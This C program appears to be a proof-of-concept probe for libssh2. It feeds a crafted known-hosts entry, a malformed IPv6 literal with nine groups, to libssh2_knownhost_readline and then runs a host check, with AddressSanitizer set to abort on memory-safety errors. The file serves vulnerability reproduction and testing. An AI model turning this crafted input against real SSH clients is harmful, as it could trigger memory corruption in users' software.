/* Drives libssh2's public known-hosts API with an attacker-influenced
 * known-hosts entry and a host check, the way a client application
 * verifying a server host key would.
 *
 * No network access is involved: the known-hosts line is fed straight to
 * libssh2_knownhost_readline() and matched with libssh2_knownhost_check().
 */
#include <stdio.h>
#include <string.h>

#include <libssh2.h>

#if defined(__SANITIZE_ADDRESS__)
/* Default ASan options for this probe: die via SIGABRT (as harnesses expect)
 * rather than ASan's plain exit(1) when a genuine memory-safety violation is
 * detected. Only takes effect on the ASan error path; a clean run exits 0. */
const char *__asan_default_options(void);
const char *__asan_default_options(void)
{
    return "abort_on_error=1";
}
#endif

int main(void)
{
    /* Crafted known-hosts entry: a plain host whose textual form is an
     * IPv6 literal carrying a compression marker plus nine group words.
     * The stored entry is the untrusted input here. */
    static const char line[] =
        "::1:2:3:4:5:6:7:8:9 ssh-ed25519 "
        "AAAAC3NzaC1lZDI1NTE5AAAAID6f4Z6f4Z6f4Z6f4Z6f4Z6f4Z6f4Z6f4Z";
    static const char key[] =
        "AAAAC3NzaC1lZDI1NTE5AAAAID6f4Z6f4Z6f4Z6f4Z6f4Z6f4Z6f4Z6f4Z";

    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *hosts;
    int rc;

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 2;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        return 2;
    }

    hosts = libssh2_knownhost_init(session);
    if(!hosts) {
        fprintf(stderr, "libssh2_knownhost_init failed\n");
        return 2;
    }

    rc = libssh2_knownhost_readline(hosts, line, strlen(line),
                                    LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    if(rc)
        fprintf(stderr, "readline rc=%d (continuing)\n", rc);

    /* The application checks its own (textually different, well-formed)
     * host against the collection holding the crafted entry. */
    rc = libssh2_knownhost_check(hosts, "1::9", key, strlen(key),
                                 LIBSSH2_KNOWNHOST_TYPE_PLAIN |
                                 LIBSSH2_KNOWNHOST_KEYENC_BASE64 |
                                 LIBSSH2_KNOWNHOST_KEY_ED25519,
                                 NULL);
    fprintf(stderr, "check rc=%d\n", rc);

    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}
